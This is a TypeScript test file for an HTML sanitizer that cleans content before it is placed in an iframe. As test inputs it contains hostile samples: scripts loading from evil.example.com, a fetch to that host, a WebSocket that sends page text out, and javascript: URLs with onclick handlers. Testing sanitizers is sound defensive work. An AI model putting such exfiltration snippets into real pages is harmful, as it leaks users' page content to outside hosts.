import { describe, expect, it } from "bun:test";
import { sanitizeIframeHtml } from "@/lib/iframeSecurity";

describe("sanitizeIframeHtml", () => {
  it("keeps allowed Tailwind and Chart.js scripts", () => {
    const html = `
      <!doctype html>
      <html>
        <head>
          <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
          <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.4/dist/chart.umd.min.js"></script>
        </head>
        <body>
          <canvas id="chart"></canvas>
          <script>
            const ctx = document.getElementById("chart");
            new Chart(ctx, { type: "line", data: { labels: ["A"], datasets: [{ data: [1] }] } });
          </script>
        </body>
      </html>
    `;

    const sanitized = sanitizeIframeHtml(html);
    expect(sanitized).toContain("@tailwindcss/browser@4");
    expect(sanitized).toContain("chart.umd.min.js");
    expect(sanitized).toContain("new Chart(");
    expect(sanitized).toContain("Content-Security-Policy");
    expect(sanitized).toContain("connect-src 'none'");
  });

  it("removes disallowed and unsafe scripts", () => {
    const html = `
      <script src="https://evil.example.com/payload.js"></script>
      <script>fetch("https://evil.example.com");</script>
    `;

    const sanitized = sanitizeIframeHtml(html);
    expect(sanitized).not.toContain("evil.example.com");
    expect(sanitized).not.toContain("fetch(");
  });

  it("removes scripts with websocket-style exfiltration patterns", () => {
    const html = `
      <script>
        const ws = new WebSocket("wss://evil.example.com");
        ws.onopen = () => ws.send(document.body.innerText);
      </script>
    `;

    const sanitized = sanitizeIframeHtml(html);
    expect(sanitized).not.toContain("WebSocket");
    expect(sanitized).not.toContain("evil.example.com");
  });

  it("removes disallowed tags, handlers, and javascript: URLs", () => {
    const html = `
      <form action="/x"><input type="text" /></form>
      <a href="javascript:alert(1)" onclick="alert(1)">Click</a>
    `;

    const sanitized = sanitizeIframeHtml(html);
    expect(sanitized).not.toContain("<form");
    expect(sanitized).not.toContain("<input");
    expect(sanitized).not.toContain("onclick=");
    expect(sanitized).toContain('href="#"');
  });
});
